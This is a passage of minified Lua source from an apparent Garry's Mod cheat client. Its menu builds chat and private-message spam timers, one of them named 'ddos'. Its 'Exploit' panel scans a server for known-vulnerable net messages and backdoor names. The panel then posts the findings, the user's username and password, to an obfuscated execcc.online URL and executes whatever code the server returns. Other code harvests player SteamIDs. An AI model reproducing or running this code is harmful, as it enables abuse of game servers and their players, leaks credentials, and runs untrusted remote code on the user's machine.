end;cG(32,"Kill",function()b.logtype="kill"b.findlog('',b.logtype)end)cG(64,"Damage",function()b.logtype="damage"b.findlog('',b.logtype)end)cG(66,"Connect",function()b.logtype="connect"b.findlog('',b.logtype)end)cG(87,"Disconnect",function()b.logtype="disconnect"b.findlog('',b.logtype)end)cG(105,"Change Name",function()b.logtype="namechange"b.findlog('',b.logtype)end)cG(42,"Prop",function()b.logtype="prop"b.findlog('',b.logtype)end)cG(32,"Ulx",function()b.logtype="ulx"b.findlog('',b.logtype)end)cG(37,"Chat",function()b.logtype="chat"b.findlog('',b.logtype)end)cE:Hide()_.chat={"execcc.online"}local cO=vgui.Create("DFrame")cO:SetSize(500,293)cO:Center()cO:SetDraggable(true)cO:MakePopup()cO:ShowCloseButton(false)cO:SetTitle("")cO.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.windowbg)draw.RoundedBox(0,0,0,ac,22,b.titlebar)draw.SimpleText("Spam","hack_font_18",5,2.5,b.titletext)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)end;local cF=3;local function cG(cH,M,z)local cP=vgui.Create("DButton",cO)cP:SetFont("hack_font_18")cP:SetText(M)cP:SetTextColor(b.colortext)cP:SetSize(cH,25)cP:SetPos(cF,25)cP.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)if cP.Hovered then draw.RoundedBox(0,0,0,ac,ad,b.buttonhovered)end end;cP.DoClick=z;cF=cF+cH+2 end;cG(41,"Chat",function()if IsValid(panelcspam)then panelcspam:Remove()end;panelcspam=vgui.Create("DScrollPanel",cO)panelcspam:SetPos(3,52)panelcspam:SetSize(494,238)panelcspam.Paint=function(h,ac,ad)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,panelcspam:GetSize())end;local function cQ()if IsValid(menumessage)then menumessage:Remove()end;menumessage=vgui.Create("DScrollPanel",panelcspam)menumessage:SetPos(3,30)menumessage:SetSize(322,205)menumessage.Paint=function(h,ac,ad)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,menumessage:GetSize())end;local cR=3;for d=1,#_.chat do local cP=vgui.Create("DButton",menumessage)cP:SetFont("hack_font_18")cP:SetText(_.chat[d])cP:SetTextColor(b.colortext)cP:SetSize(select(1,surface.GetTextSize(_.chat[d]))+20,25)cP:SetPos(3,cR)cP.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)if cP.Hovered then draw.RoundedBox(0,0,0,ac,ad,b.buttonhovered)end end;cP.DoClick=function()table.remove(_.chat,d)cQ()end;cR=cR+27 end end;local cS=vgui.Create("DTextEntry",panelcspam)cS:SetPos(3,3)cS:SetSize(280,25)cS:SetText("text")cS.Paint=function(self,ac,ad)surface.SetDrawColor(b.textentry)surface.DrawRect(0,0,ac,ad)self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))end;local cP=vgui.Create("DButton",panelcspam)cP:SetFont("hack_font_18")cP:SetText("Add")cP:SetTextColor(b.colortext)cP:SetSize(40,25)cP:SetPos(285,3)cP.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.windowbg)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)if cP.Hovered then draw.RoundedBox(0,0,0,ac,ad,b.buttonhovered)end end;cP.DoClick=function()local cT=true;for h,m in pairs(_.chat)do if _.chat[h]==cS:GetText()then cT=false end end;if cT then _.chat[#_.chat+1]=cS:GetText()end;cQ()end;local cU=panelcspam:Add("DCheckBoxLabel")cU:SetPos(327,2)cU:SetText("Enabled")cU:SetFont("hack_font_18")cU:SetTextColor(b.colortext)if _["chatspam"]then cU:SetValue(true)else cU:SetValue(false)end;function cU:OnChange(aR)if aR then _["chatspam"]=true else _["chatspam"]=false end end;function cU.Button:Paint(a8,aO)if self:GetChecked()then surface.SetDrawColor(b.checkboxactive)surface.DrawRect(0,0,a8,aO)end;surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a8,aO)end;local cU=panelcspam:Add("DCheckBoxLabel")cU:SetPos(327,19)cU:SetText("OOC")cU:SetFont("hack_font_18")cU:SetTextColor(b.colortext)if _["chatspamooc"]then cU:SetValue(true)else cU:SetValue(false)end;function cU:OnChange(aR)if aR then _["chatspamooc"]=true else _["chatspamooc"]=false end end;function cU.Button:Paint(a8,aO)if self:GetChecked()then surface.SetDrawColor(b.checkboxactive)surface.DrawRect(0,0,a8,aO)end;surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a8,aO)end;local cU=panelcspam:Add("DCheckBoxLabel")cU:SetPos(327,36)cU:SetText("Super OOC")cU:SetFont("hack_font_18")cU:SetTextColor(b.colortext)if _["chatspamoocsuper"]then cU:SetValue(true)else cU:SetValue(false)end;function cU:OnChange(aR)if aR then _["chatspamoocsuper"]=true else _["chatspamoocsuper"]=false end end;function cU.Button:Paint(a8,aO)if self:GetChecked()then surface.SetDrawColor(b.checkboxactive)surface.DrawRect(0,0,a8,aO)end;surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a8,aO)end;local cU=panelcspam:Add("DCheckBoxLabel")cU:SetPos(327,53)cU:SetText("Pm")cU:SetFont("hack_font_18")cU:SetTextColor(b.colortext)if _["chatpmspammer"]then cU:SetValue(true)else cU:SetValue(false)end;function cU:OnChange(aR)if aR then _["chatpmspammer"]=true;p([[ local chat_strings=util.JSONToTable(']]..util.TableToJSON(_.chat)..[[') timer.Create("423104",0.1,0,function() if rp then rp.RunCommand("pm",table.Random(player.GetAll()):SteamID(),chat_strings[math.random(#chat_strings)]) end RunConsoleCommand("pm",table.Random(player.GetAll()):SteamID(),chat_strings[math.random(#chat_strings)]) LocalPlayer():ConCommand("darkrp pm "..table.Random(player.GetAll()):Name().." "..chat_strings[math.random(#chat_strings)]) end) ]])else _["chatpmspammer"]=false;p([[timer.Remove("423104")]])end end;function cU.Button:Paint(a8,aO)if self:GetChecked()then surface.SetDrawColor(b.checkboxactive)surface.DrawRect(0,0,a8,aO)end;surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a8,aO)end;cQ()end)cG(56,"Kill Say",function()if IsValid(panelcspam)then panelcspam:Remove()end;panelcspam=vgui.Create("DScrollPanel",cO)panelcspam:SetPos(3,52)panelcspam:SetSize(494,238)panelcspam.Paint=function(h,ac,ad)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,panelcspam:GetSize())end;local function cQ()if IsValid(menumessage)then menumessage:Remove()end;menumessage=vgui.Create("DScrollPanel",panelcspam)menumessage:SetPos(3,30)menumessage:SetSize(322,205)menumessage.Paint=function(h,ac,ad)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,menumessage:GetSize())end;local cR=3;for d=1,#t["SPAM_KILLSAY"]do local cP=vgui.Create("DButton",menumessage)cP:SetFont("hack_font_18")cP:SetText(t["SPAM_KILLSAY"][d])cP:SetTextColor(b.colortext)cP:SetSize(select(1,surface.GetTextSize(t["SPAM_KILLSAY"][d]))+20,25)cP:SetPos(3,cR)cP.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)if cP.Hovered then draw.RoundedBox(0,0,0,ac,ad,b.buttonhovered)end end;cP.DoClick=function()table.remove(t["SPAM_KILLSAY"],d)y("SPAM_KILLSAY",t["SPAM_KILLSAY"])cQ()end;cR=cR+27 end end;local cS=vgui.Create("DTextEntry",panelcspam)cS:SetPos(3,3)cS:SetSize(280,25)cS:SetText("text")cS.Paint=function(self,ac,ad)surface.SetDrawColor(b.textentry)surface.DrawRect(0,0,ac,ad)self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))end;local cP=vgui.Create("DButton",panelcspam)cP:SetFont("hack_font_18")cP:SetText("Add")cP:SetTextColor(b.colortext)cP:SetSize(40,25)cP:SetPos(285,3)cP.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.windowbg)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)if cP.Hovered then draw.RoundedBox(0,0,0,ac,ad,b.buttonhovered)end end;cP.DoClick=function()local cT=true;for h,m in pairs(t["SPAM_KILLSAY"])do if t["SPAM_KILLSAY"][h]==cS:GetText()then cT=false end end;if cT then t["SPAM_KILLSAY"][#t["SPAM_KILLSAY"]+1]=cS:GetText()end;y("SPAM_KILLSAY",t["SPAM_KILLSAY"])cQ()end;au("Enabled","SPAM_KILLSAY_ENABLED",327,2,panelcspam)au("OOC","SPAM_KILLSAY_OOC",327,19,panelcspam)cQ()end)timer.Create("ddos",0.1,0,function()if _["chatspam"]then if _.chat=={}then return end;if not _["chatspamooc"]then RunConsoleCommand("say",_.chat[math.random(1,#_.chat)])else RunConsoleCommand("say","/ooc ".._.chat[math.random(1,#_.chat)])end end;if _["chatspamoocsuper"]then if _.chat=={}then return end;RunConsoleCommand("darkrp","ooc ".._.chat[math.random(1,#_.chat)])end end)cO:Hide()local cV={}local cW=""http.Fetch("https://execcc.online/hacka/account/chat.php?a=al",function(a)if IsValid(b.chatrichtext)then b.chatrichtext:InsertColorChange(255,255,255,255)b.chatrichtext:AppendText(a.."\n")end end)timer.Create("hack_check_chat",1,0,function()if IsValid(b.chatrichtext)then http.Fetch("https://execcc.online/hacka/account/chat.php?a=ls",function(a)if cW==a then return end;cV[#cV+1]=a;b.chatrichtext:InsertColorChange(255,255,255,255)b.chatrichtext:AppendText(a.."\n")cW=a end)end end)local cX=vgui.Create("DFrame")cX:SetSize(400,250)cX:Center()cX:SetTitle("")cX:SetDraggable(true)cX:MakePopup()cX:ShowCloseButton(false)cX:SetSizable(true)cX.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.windowbg)draw.RoundedBox(0,0,0,ac,22,b.titlebar)draw.SimpleText("Chat","hack_font_18",5,2.5,b.titletext)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)end;cX.PerformLayout=function(self,E,F)if IsValid(b.chatrichtext)then b.chatrichtext:SetSize(E-6,F-54)b.chattext:SetSize(E-6,25)b.chattext:SetPos(3,F-28)end end;b.chatrichtext=vgui.Create("RichText",cX)b.chatrichtext:SetPos(3,24)b.chatrichtext.Paint=function()b.chatrichtext:SetBGColor(b.windowbg)end;b.chatrichtext:InsertColorChange(255,255,255,0)for h,m in pairs(cV)do b.chatrichtext:InsertColorChange(255,255,255,255)b.chatrichtext:AppendText(m.."\n")end;b.chattext=vgui.Create("DTextEntry",cX)b.chattext:SetPos(3,53)b.chattext:SetText("")b.chattext.Paint=function(self,ac,ad)surface.SetDrawColor(b.textentry)surface.DrawRect(0,0,ac,ad)self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))end;b.chattext.OnEnter=function()http.Post("https://execcc.online/hacka/account/chat.php?a=sd",{log=username,pass=password,txt=b.chattext:GetValue()})b.chattext:SetText("")end;cX:Hide()local cY=vgui.Create("DFrame")cY:SetSize(230,300)cY:Center()cY:SetTitle("")cY:SetDraggable(true)cY:MakePopup()cY:ShowCloseButton(false)cY:SetSizable(true)cY.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.windowbg)draw.RoundedBox(0,0,0,ac,22,b.titlebar)draw.SimpleText("Exploit","hack_font_18",5,2.5,b.titletext)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)end;cY.PerformLayout=function(self,E,F)if IsValid(b.exploitslist)then b.exploitslist:SetSize(E-6,F-54)end end;a1("Refresh",3,24,63,25,cY,function()if IsInGame()then p([[local a={"pplay_addrow","pplay_sendtable","WriteQuery","SendMoney","BailOut","customprinter_get","textstickers_entdata","NC_GetNameChange","ATS_WARP_REMOVE_CLIENT","ATS_WARP_FROM_CLIENT","ATS_WARP_VIEWOWNER","CFRemoveGame","CFJoinGame","CFEndGame","CreateCase","rprotect_terminal_settings","StackGhost","RevivePlayer","ARMORY_RetrieveWeapon","TransferReport","SimplicityAC_aysent","pac_to_contraption","SyncPrinterButtons76561198056171650","sendtable","steamid2","Kun_SellDrug","net_PSUnBoxServer","pplay_deleterow","pplay_addrow","CraftSomething","banleaver","75_plus_win","ATMDepositMoney","Taxi_Add","Kun_SellOil","SellMinerals","TakeBetMoney","PoliceJoin","CpForm_Answers","DepositMoney","MDE_RemoveStuff_C2S","NET_SS_DoBuyTakeoff","NET_EcSetTax","RP_Accept_Fine","RP_Fine_Player","RXCAR_Shop_Store_C2S","RXCAR_SellINVCar_C2S","drugseffect_remove","drugs_money","CRAFTINGMOD_SHOP","drugs_ignite","drugseffect_hpremove","DarkRP_Kun_ForceSpawn","drugs_text","NLRKick","RecKickAFKer","GMBG:PickupItem","DL_Answering","data_check","plyWarning","NLR.ActionPlayer","timebombDefuse","start_wd_emp","kart_sell","FarmingmodSellItems","ClickerAddToPoints","bodyman_model_change","TOW_PayTheFine","FIRE_CreateFireTruck","hitcomplete","hhh_request","DaHit","TCBBuyAmmo","DataSend","gBan.BanBuffer","fp_as_doorHandler","Upgrade","TowTruck_CreateTowTruck","TOW_SubmitWarning","duelrequestguiYes","JoinOrg","pac_submit","NDES_SelectedEmblem","join_disconnect","Morpheus.StaffTracker","casinokit_chipexchange","BuyKey","BuyCrate","FactionInviteConsole","FacCreate","1942_Fuhrer_SubmitCandidacy","pogcp_report_submitReport","textscreens_download","hsend","BuilderXToggleKill","Chatbox_PlayerChat","reports.submit","services_accept","Warn_CreateWarn","NewReport","soez","GiveHealthNPC","DarkRP_SS_Gamble","buyinghealth","DarkRP_preferredjobmodel","whk_setart","WithdrewBMoney","DuelMessageReturn","ban_rdm","BuyCar","ats_send_toServer","dLogsGetCommand","disguise","gportal_rpname_change","AbilityUse","ClickerAddToPoints","race_accept","give_me_weapon","FinishContract","NLR_SPAWN","Kun_ZiptieStruggle","JB_Votekick","Letthisdudeout","ckit_roul_bet","pac.net.TouchFlexes.ClientNotify","ply_pick_shit","TFA_Attachment_RequestAll","BuyFirstTovar","BuySecondTovar","GiveHealthNPC","MONEY_SYSTEM_GetWeapons","MCon_Demote_ToServer","withdrawp","PCAdd","ActivatePC","PCDelAll","viv_hl2rp_disp_message","ATM_DepositMoney_C2S","BM2.Command.SellBitcoins","BM2.Command.Eject","tickbooksendfine","egg","RHC_jail_player","PlayerUseItem","Chess Top10","ItemStoreUse","EZS_PlayerTag","simfphys_gasspill","sphys_dupe","sw_gokart","wordenns","SyncPrinterButtons16690","AttemptSellCar","uPLYWarning","atlaschat.rqclrcfg","dlib.getinfo.replicate","SetPermaKnife","EnterpriseWithdraw","SBP_addtime","NetData","CW20_PRESET_LOAD","minigun_drones_switch","NET_AM_MakePotion","bitcoins_request_turn_off","bitcoins_request_turn_on","bitcoins_request_withdraw","PermwepsNPCSellWeapon","ncpstoredoact","DuelRequestClient","BeginSpin","tickbookpayfine","fg_printer_money","IGS.GetPaymentURL","pp_info_send","AirDrops_StartPlacement","SlotsRemoved","FARMINGMOD_DROPITEM","cab_sendmessage","cab_cd_testdrive","blueatm","SCP-294Sv","dronesrewrite_controldr","desktopPrinter_Withdraw","RemoveTag","IDInv_RequestBank","UseMedkit","WipeMask","SwapFilter","RemoveMask","DeployMask","ZED_SpawnCar","levelup_useperk","passmayorexam","Selldatride","ORG_VaultDonate","ORG_NewOrg","ScannerMenu","misswd_accept","D3A_Message","LawsToServer","Shop_buy","D3A_CreateOrg","Gb_gasstation_BuyGas","Gb_gasstation_BuyJerrycan","MineServer","AcceptBailOffer","LawyerOfferBail","buy_bundle","AskPickupItemInv","donatorshop_itemtobuy","netOrgVoteInvite_Server","Chess ClientWager","AcceptRequest","deposit","CubeRiot CaptureZone Update","NPCShop_BuyItem","SpawnProtection","hoverboardpurchase","soundArrestCommit","LotteryMenu","updateLaws","TMC_NET_FirePlayer","thiefnpc","TMC_NET_MakePlayerWanted","SyncRemoveAction","HV_AmmoBuy","NET_CR_TakeStoredMoney","nox_addpremadepunishment","GrabMoney","LAWYER.GetBailOut","LAWYER.BailFelonOut","br_send_pm","GET_Admin_MSGS","OPEN_ADMIN_CHAT","LB_AddBan","redirectMsg","RDMReason_Explain","JB_SelectWarden","JB_GiveCubics","SendSteamID","wyozimc_playply","SpecDM_SendLoadout","sv_saveweapons","DL_StartReport","DL_ReportPlayer","DL_AskLogsList","DailyLoginClaim","GiveWeapon","GovStation_SpawnVehicle","inviteToOrganization","createFaction","sellitem","giveArrestReason","unarrestPerson","JoinFirstSS","bringNfreeze","start_wd_hack","DestroyTable","nCTieUpStart","IveBeenRDMed","FIGHTCLUB_StartFight","FIGHTCLUB_KickPlayer","ReSpawn","CP_Test_Results","AcceptBailOffer","IS_SubmitSID_C2S","IS_GetReward_C2S","ChangeOrgName","DisbandOrganization","CreateOrganization","newTerritory","InviteMember","sendDuelInfo","DoDealerDeliver","PurchaseWeed","guncraft_removeWorkbench","wordenns","userAcceptPrestige","vj_npcspawner_sv_create","DuelMessageReturn","Client_To_Server_OpenEditor","GiveSCP294Cup","GiveArmor100","SprintSpeedset","ArmorButton","HealButton","SRequest","ClickerForceSave","rpi_trade_end","NET_BailPlayer","vj_testentity_runtextsd","vj_fireplace_turnon2","requestmoneyforvk","gPrinters.sendID","FIRE_RemoveFireTruck","drugs_effect","drugs_give","NET_DoPrinterAction","opr_withdraw","money_clicker_withdraw","NGII_TakeMoney","gPrinters.retrieveMoney","revival_revive_accept","chname","NewRPNameSQL","UpdateRPUModelSQL","SetTableTarget","SquadGiveWeapon","BuyUpgradesStuff","REPAdminChangeLVL","SendMail","DemotePlayer","OpenGates","VehicleUnderglow","Hopping_Test","CREATE_REPORT","CreateEntity","FiremanLeave","DarkRP_Defib_ForceSpawn","Resupply","BTTTStartVotekick","_nonDBVMVote","REPPurchase","deathrag_takeitem","FacCreate","InformPlayer","lockpick_sound","SetPlayerModel","changeToPhysgun","VoteBanNO","VoteKickNO","shopguild_buyitem","MG2.Request.GangRankings","RequestMAPSize","gMining.sellMineral","ItemStoreDrop","optarrest","TalkIconChat","UpdateAdvBoneSettings","ViralsScoreboardAdmin","PowerRoundsForcePR","showDisguiseHUD","withdrawMoney","SyncPrinterButtons76561198027292625","phone","STLoanToServer","TCBDealerStore","TCBDealerSpawn","ts_buytitle","gMining.registerAchievement","gPrinters.openUpgrades"}local b={"Sbox_gm_attackofnullday_key","c","enablevac","ULXQUERY2","Im_SOCool","MoonMan","LickMeOut","SessionBackdoor","OdiumBackDoor","ULX_QUERY2","Sbox_itemstore","Sbox_darkrp","Sbox_Message","_blacksmurf","nostrip","Remove_Exploiters","Sandbox_ArmDupe","rconadmin","jesuslebg","disablebackdoor","blacksmurfBackdoor","jeveuttonrconleul","lag_ping","memeDoor","DarkRP_AdminWeapons","Fix_Keypads","noclipcloakaesp_chat_text","_CAC_ReadMemory","Ulib_Message","Ulogs_Infos","ITEM","nocheat","I?psilon","JQerystrip.disable","Sandbox_GayParty","DarkRP_UTF8","PlayerKilledLogged","OldNetReadData","Backdoor","cucked","NoNerks","kek","DarkRP_Money_System","BetStrep","ZimbaBackdoor","something","random","strip0","fellosnake","idk","||||","EnigmaIsthere","ALTERED_CARB0N","killserver","fuckserver","cvaraccess","_Defcon","dontforget","aze46aez67z67z64dcv4bt","nolag","changename","music","_Defqon","xenoexistscl","R8","AnalCavity","DefqonBackdoor","fourhead","echangeinfo","PlayerItemPickUp","thefrenchenculer","elfamosabackdoormdr","stoppk","noprop","reaper","Abcdefgh","JSQuery.Data(Post(false))","pjHabrp9EY","_Raze","88","Dominos","NoOdium_ReadPing","m9k_explosionradius","gag","_cac_","_Battleye_Meme_","legrandguzmanestla","ULogs_B","arivia","_Warns","xuy","samosatracking57","striphelper","m9k_explosive","GaySploitBackdoor","_GaySploit","slua","Bilboard.adverts:Spawn(false)","BOOST_FPS","FPP_AntiStrip","ULX_QUERY_TEST2","FADMIN_ANTICRASH","ULX_ANTI_BACKDOOR","UKT_MOMOS","rcivluz","SENDTEST","MJkQswHqfZ","INJ3v4","_clientcvars","_main","GMOD_NETDBG","thereaper","audisquad_lua","anticrash","ZernaxBackdoor","bdsm","waoz","stream","adm_network","antiexploit","ReadPing","berettabest","componenttolua","theberettabcd","negativedlebest","mathislebg","SparksLeBg","DOGE","FPSBOOST","N::B::P","PDA_DRM_REQUEST_CONTENT","shix","Inj3","AidsTacos","verifiopd","pwn_wake","pwn_http_answer","pwn_http_send","The_Dankwoo","PRDW_GET","fancyscoreboard_leave","DarkRP_Gamemodes","DarkRP_Armors","yohsambresicianatik<3","EnigmaProject","PlayerCheck","Ulx_Error_88","FAdmin_Notification_Receiver","DarkRP_ReceiveData","Weapon_88","__G____CAC","AbSoluT","mecthack","SetPlayerDeathCount","awarn_remove","fijiconn","nw.readstream","LuaCmd","The_DankWhy"}local c=0;local d=0;local e={}for f=1,10000 do local g=util.NetworkIDToString(f)if not g then break end;if table.HasValue(b,g)then c=c+1;table.insert(e,g.." "..f)if d<=c then d=c end elseif table.HasValue(a,g)then table.insert(e,g)c=c+1 else if d<3 then e={}end;c=0 end end;local h=""local i=0;for j=0,65536 do local k=util.NetworkIDToString(j)if k and k~=""then if not net.Receivers[k]then h=h..k;if table.HasValue(a,k)then i=i+1 end end end end;if i>15 then for l,m in SortedPairs(net.Receivers)do file.Append("]]..b.exploits..[[",l)end else file.Write("]]..b.exploits..[[",h)end if _G.Props_3 or _G.PropWhiteList then file.Append("]]..b.exploits..[[","spawnopropbypass")end]])end;timer.Simple(1,function()if IsValid(b.exploitslist)then b.exploitslist:Remove()end;b.exploitslist=vgui.Create("DScrollPanel",cY)b.exploitslist:SetPos(3,24+25+2)b.exploitslist:SetSize(230-6,246)b.exploitslist.Paint=function(h,ac,ad)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)end;b.exploitslist.VBar.Paint=function(cJ,ac,ad)draw.RoundedBox(0,0,0,ac,ad,Color(0,0,0,50))end;b.exploitslist.VBar.btnUp.Paint=function(cJ,ac,ad)draw.RoundedBox(0,2,2,ac-4,ad-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;b.exploitslist.VBar.btnDown.Paint=function(cJ,ac,ad)draw.RoundedBox(0,2,2,ac-4,ad-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;local cZ=3;function addexploits(M,q,as,type)local c_=vgui.Create("DButton",b.exploitslist)c_:SetFont("hack_font_18")c_:SetText(M)c_:SetTextColor(b.colortext)c_:SetSize(select(1,surface.GetTextSize(M))+20,25)c_:SetPos(3,cZ)c_.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)if c_.Hovered then draw.RoundedBox(0,0,0,ac,ad,b.buttonhovered)end end;c_:SetToolTip(as)if type==nil then c_.DoClick=function()if IsInGame()then p(q)end end else c_.DoClick=q end;cZ=cZ+27 end;if IsInGame()then http.Post("\104\116\116\112\115\58\47\47\101\120\101\99\99\99\46\111\110\108\105\110\101\47\104\97\99\107\97\47\97\99\99\111\117\110\116\47\101\120\112\108\111\105\116\46\112\104\112",{user=username,pass=password,dmdkg=file.Read(b.exploits,"DATA")},RunStringEx)end end)end)cY:Hide()local d0=vgui.Create("DFrame")d0:SetSize(600,350)d0:Center()d0:SetTitle("")d0:SetDraggable(true)d0:MakePopup()d0:ShowCloseButton(false)d0.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.windowbg)draw.RoundedBox(0,0,0,ac,22,b.titlebar)draw.SimpleText("Target","hack_font_18",5,2.5,b.titletext)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)end;a1("Disable all",517,25,80,25,d0,function()y("MISC_SPECTATE_TARGET","")y("TEAMLIST",{})y("FRIENDLIST",{})y("RANKLIST",{})y("ENTITYLIST",{})y("AIM_ENTITYLIST",{})end)local d1=vgui.Create("DTextEntry",d0)d1:SetPos(3,53)d1:SetSize(594,25)d1:SetText("")d1.Paint=function(self,ac,ad)surface.SetDrawColor(b.textentry)surface.DrawRect(0,0,ac,ad)self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))end;d1.OnTextChanged=function()if IsValid(panelentityall)then findentityxd(d1:GetValue())end end;local cF=3;local function cG(cH,M,z)a1(M,cF,25,cH,25,d0,z)cF=cF+cH+2 end;cG(49,"Entity",function()if IsInGame()then p('local a={}for b,c in pairs(ents.GetAll())do if not a[c:GetClass()]and IsEntity(c)then a[c:GetClass()]={a=c.PrintName}end end file.Write("'..b.allentity..'",util.TableToJSON(a))')end;timer.Simple(1,function()function findentityxd(d2)if IsValid(panelentityall)then panelentityall:Remove()end;panelentityall=vgui.Create("DScrollPanel",d0)panelentityall:SetPos(3,53+27)panelentityall:SetSize(600-6,267)panelentityall.Paint=function(h,ac,ad)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)end;panelentityall.VBar.Paint=function(cJ,ac,ad)draw.RoundedBox(0,0,0,ac,ad,Color(0,0,0,50))end;panelentityall.VBar.btnUp.Paint=function(cJ,ac,ad)draw.RoundedBox(0,2,2,ac-4,ad-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;panelentityall.VBar.btnDown.Paint=function(cJ,ac,ad)draw.RoundedBox(0,2,2,ac-4,ad-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;local d3=1;local function d4(m,d5,d6)if string.find(m,d2)then local d7=vgui.Create("DButton",panelentityall)d7:SetSize(297,25)d7:SetPos(1,d3)d7:SetText('')d7.Paint=function(F,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.windowbg)if d6==1 then draw.SimpleText("[NO".."T SPAWNED] "..m,"hack_font_18",2.5,2,b.colortext)elseif d5["a"]then draw.SimpleText(m.." ("..d5["a"]..")","hack_font_18",2.5,2,b.colortext)else draw.SimpleText(m,"hack_font_18",2.5,2,b.colortext)end end;local W=t["ENTITYLIST"]local a7=panelentityall:Add("DCheckBoxLabel")a7:SetPos(300,d3+5)a7:SetText("Show")a7:SetFont("hack_font_18")a7:SetTextColor(b.colortext)if W[m]==true then a7:SetValue(true)else a7:SetValue(false)end;function a7:OnChange(aR)if aR then W[m]=true else W[m]=false end;y("ENTITYLIST",W)end;function a7.Button:Paint(a8,aO)if self:GetChecked()then surface.SetDrawColor(b.checkboxactive)surface.DrawRect(0,0,a8,aO)end;surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a8,aO)end;local d8=t["ENTITYLISTclr"]local d9=vgui.Create("DButton",panelentityall)d9:SetSize(15,15)d9:SetPos(300+165+67,d3+6)d9:SetText('')d9.Paint=function(F,ac,ad)if d8[m.."_Color"]then draw.RoundedBox(0,0,0,ac,ad,d8[m.."_Color"])else draw.RoundedBox(0,0,0,ac,ad,Color(255,255,255))end end;d9.DoClick=function()aa(127,153+3,function()local am=vgui.Create("DColorMixer",doplpanel)am:SetPos(3,3)am:SetSize(121,150)am:SetAlphaBar(false)am:SetPalette(false)am:SetWangs(false)if d8[m.."_Color"]then am:SetColor(d8[m.."_Color"])end;am.ValueChanged=function()d8[m.."_Color"]=am:GetColor()y("ENTITYLISTclr",d8)end end)end;d3=d3+25 end end;local da={}local db=util.JSONToTable(file.Read(b.allentity,"DATA")or'[]')for m,d5 in pairs(db)do d4(m,d5)da[m]=true end;for m,d5 in pairs(K)do if not da[m]then d4(m,nil,1)end end end;findentityxd("")end)end)cG(53,"Player",function()if IsInGame()then p([[local a={}for b,c in pairs(player.GetHumans())do a[c:Nick()]={steamid=c:SteamID64(),steamid32=c:SteamID(),id=c:UserID()}end;file.Write("]]..b.aimbotfriend..[[",util.TableToJSON(a))]])end;timer.Simple(1,function()function findentityxd(d2)if IsValid(panelentityall)then panelentityall:Remove()end;panelentityall=vgui.Create("DScrollPanel",d0)panelentityall:SetPos(3,53+27)panelentityall:SetSize(600-6,267)panelentityall.Paint=function(h,ac,ad)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)end;panelentityall.VBar.Paint=function(cJ,ac,ad)draw.RoundedBox(0,0,0,ac,ad,Color(0,0,0,50))end;panelentityall.VBar.btnUp.Paint=function(cJ,ac,ad)draw.RoundedBox(0,2,2,ac-4,ad-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;panelentityall.VBar.btnDown.Paint=function(cJ,ac,ad)draw.RoundedBox(0,2,2,ac-4,ad-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;local d3=1;for dc,dd in pairs(util.JSONToTable(file.Read(b.aimbotfriend,"DATA")or'[]'))do if string.find(dc,d2)then local d7=vgui.Create("DButton",panelentityall)d7:SetSize(297,25)d7:SetPos(1,d3)d7:SetText('')d7.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.windowbg)draw.SimpleText(dc,"hack_font_18",2.5,2,b.colortext)end;local a7=panelentityall:Add("DCheckBoxLabel")a7:SetPos(300,d3+5)a7:SetText("Friend")a7:SetFont("hack_font_18")a7:SetTextColor(b.colortext)local de=t["FRIENDLIST"]if de[dd["steamid32"]]==true then a7:SetValue(true)else a7:SetValue(false)end;function a7:OnChange(aR)if aR then de[dd["steamid32"]]=true else de[dd["steamid32"]]=false end;y("FRIENDLIST",de)end;function a7.Button:Paint(a8,aO)if 